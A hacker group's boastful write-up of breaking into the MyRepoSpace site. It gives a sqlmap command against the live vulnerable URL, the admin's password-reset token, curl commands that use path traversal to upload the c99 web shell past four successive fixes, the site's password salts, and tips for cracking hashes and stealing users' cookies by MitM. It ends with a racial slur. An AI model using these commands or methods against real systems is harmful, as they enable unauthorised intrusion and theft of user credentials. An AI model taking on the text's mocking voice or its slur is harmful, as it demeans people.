# How We Hacked MyRepoSpace
For this write-up, I'm going to only cover _how_ we were able to gain access to the MRS server, and not the reasons for us doing so.

### How it started
The first bug we used on MRS was a blind SQL injection, found by Ben. This let us access all information stored in the websites databases, but being a blind injection, retrieving anything was very slow. We inadvertently DOS'd the site doing this, bringing it down a few times... Oops.

The URL vulnerable to the injection is: 
```
http://myrepospace.com/register/check1.php?nick=1
```

Using SQLMap, we could gain a SQL shell with:
```
./sqlmap.py -u "http://myrepospace.com/register/check1.php?nick=1" --sql-shell
```

**This has not been fixed**

Using this injection, Ben started snooping through the database contents and  discovered something interesting. Located in the `users` database was a column called `forgetToken`. Investigating further, it was revealed that this token was a randomly generated string, 32 characters long, used for password resets. And it was stored in plain text. 
When you combine this token with the users `id`, you can then do something like this:
```
https://www.myrepospace.com/login/forgot.php?id=215086&v=93bfb5d60cd3778ec5558e29dc3e8c09
```

And you would be greeted with this:

<!-- ![Password reset page](http://i.imgur.com/tlt5kVI.png) -->
![Password reset page](https://raw.githubusercontent.com/BannerBomb/MyRepoSpace-Hack/master/687474703a2f2f692e696d6775722e636f6d2f746c74356b56492e706e67.png)

We could change any users password, access any account that we wanted. The admin account for the site was user id `1`, and with a forgetToken of `0efd8bb79347ada32d249d5f77e6149c`.

### What next?
So this is fun, we could access any account on the site, including the admin's account - but we wanted more. So I went searching. 

One of MRS's 'tools' is iDeb - a part of the site that allows you to upload a zip file, and it converts it into a deb file. This is very handy, but unfortunately it was written very poorly. 

It worked by moving the uploaded zipped file to a temporary directory, unzipping the contents, and then running the `ar` command on the unpacked files to create the debian package. The temporary directory would look something like `http://www.myrepospace.com/iDeb/temp/July/5599b6ff99dba/`, and was completely accessible to us. **This is bad**.

So after figuring out how the iDeb system worked, I simply took a popular php shell, c99.php, zipped it, and uploaded it to be packaged as a deb. Once uploaded, I navigated to the newly created temp directory for the upload, and sure enough `c99.php` was the first file listed. We now had full access to the server, including access to the mysql database. [Discovered by Ethan]

<!-- ![MySQL database on MRS](http://i.imgur.com/5pihv7Z.png) -->
![MySQL database on MRS](https://raw.githubusercontent.com/BannerBomb/MyRepoSpace-Hack/master/687474703a2f2f692e696d6775722e636f6d2f3570696876375a2e706e67.png)

### Admin's fix part 1
The first fix the owner of the site did was moving the temporary directory files were unpacked in to a place we couldn't access - `~/tmp`, the full path being something like `~/tmp/iDeb/July/5599b6ff99dba/zip_contents_here`. You'll notice that random string - this is called a UID and is randomly generated **client side** and sent to the server when you upload a zip file. On the server, iDeb runs this code, creating the directory with the UID:

```
$uID = $_POST['UPLOAD_IDENTIFIER'];
$tmp = "/home/myreposp/tmp/iDeb";
$to = "$tmp/$month/$uID/";

if(!File_exists($to)){
	mkdir($to, 0755, true);
}
```
In order to access our uploaded files (the php shell), we need to have them uploaded to a place accessible to us - specifically `/home/myreposp/public_HTML`. Since the `UID` is created client side, we can manually specify it - and since the site doesn't perform any type of checks on the `UID` its sent, we can do some dirty things using curl and path traversal.

```
curl -F "UPLOAD_IDENTIFIER=../../../public_html" -F "upload=@c99.zip" http://www.myrepospace.com/iDeb/upload.php
```

This would unpack our zipped file's contents to the root directory of the website... and we were back in. [Discovered by Ben]

### Admins's fix part 2 
The next thing the site owner did was make the `public_html` directory `root` owned - meaning we couldn't write any files to it. This was actually a pretty clever move, but was executed fairly bad. He forgot to make any subdirectories root owned. `~/public_html/` was off limits, but `~/public_html/vip` wasn't. 

```
curl -F "UPLOAD_IDENTIFIER=../../../public_html/vip" -F "upload=@c99.zip" http://www.myrepospace.com/iDeb/upload.php
```

We were back in. [Discovered by Ethan]

### Admin's fix part 3
After this breach, the tool was modified to delete the unpacked files after the deb was created. It would take the zip file, unpack it, use `ar` to make the deb, and then delete everything except for the new deb, and the original zip (both of which were useless to us). 

Ok, no problemo! We'll just stop uploading zip files, and start uploading our php shell directly, since the only file type check was done client side through ajax. 

```
curl -F "UPLOAD_IDENTIFIER=../../../public_html/vip" -F "upload=@c99.php" http://www.myrepospace.com/iDeb/upload.php
```

And once again, we were in. [Discovered by Andy]

### Admin's fix part 4
So the admin caught on to us uploaded php files, and added a regex check in `upload.php` to ensure no non-zips were uploaded. When we tried to upload our php shell, it returned a scary error telling us we were uploading an invalid file. Awh! But no worries... even though it threw an error at us, it still uploaded our file as usual. Nice job admin!

```
curl -F "UPLOAD_IDENTIFIER=../../../public_html/vip" -F "upload=@c99.php" http://www.myrepospace.com/iDeb/upload.php
```

Ignoring scary errors, we were still in. [Discovered by Andy]

## ¯\\\_(&#12484;)_/¯
That's about it, after the last breach the iDeb tool was properly fixed, and our method of getting in was broken. But have no fear, we released the source code to the site, which will reveal that it is littered with bugs and sql injections! All of these 'hacks' were achieved through exploiting a single file, who knows how many other files are as vulnerable as this one was.

~herpes

### About passwords
Passwords were initially **unsalted md5**, until the 2nd of February when the admin switched to... md5 with a static salt. "MRS-WINS", prepended to the password, in case you were wondering. The admin was [quite proud of this](https://twitter.com/myRepoSpace/status/562613742794706944). He kindly left the old passwords in the database for people who hadn't yet changed theirs. We were able to recover about 5000 through rainbow tables and basic dictionary attacks on a recent mid-range CPU in a few hours alone (for research purposes only - but honestly, us telling you we did this is better than someone else secretly using it for evil).

Password resets always use the same static hash (again, an md5 of the password and the unix time of registration tacked on) and so to get into someone's account you can just grab that and paste it into the password reset url. I don't think these ever got re-generated so if someone got a hold of it, you'd be pretty screwed.

After we leaked the user database, the admin changed the hashing to... md5 with a static salt. Now it's "MRS-WINS-AGAIN" - yeah um, nice try but not quite. Apparently the fact that md5 has long been considered obsolete, flawed, and very fast to brute-force on modern hardware, in combination with the fact that a static salt does very little to help, isn't enough to make him spend a moment googling to find how passwords *should* be stored. Grab an md5 from the dump and spend some time learning how to log in without knowing the password by using a colliding hash - go on, I'll wait.

Oh well. It doesn't even matter any more, anyway, because he now kindly sends you a copy of your password hash as a cookie. 

```php
setcookie("gxli","2g".base64_encode("$_SESSION[userID]-$md5pass"),$time+58060800, '/', '.myrepospace.com',false,true);
```

So if you'd like to have a crack at bruteforcing someone's password, just MitM them to grab their cookies (not all of MyRepoSpace enforces HTTPS - oh, and we have their SSL key anyway). Or, change your own user ID, since it's used for the admin's logging. Last we saw this was one of the few places left that allows for an SQLi too. Child's play, really.

You might not think it's a big deal for a not so sensitive site like MyRepoSpace but any time passwords (hashed or not) are leaked, you can guarantee that many people would have used the same password on other sites that may very well be sensitive. There's also the thing of uploading evil packages on otherwise trustable people's repos.

Even if the MyRepoSpace admin claims everything is fixed, it's not. Don't waste your time, go make a repo on GitHub or something.

~ Andy

Fuck bein' on some chill shit. We go 0 to 100 nigga, real quick.

~haifisch
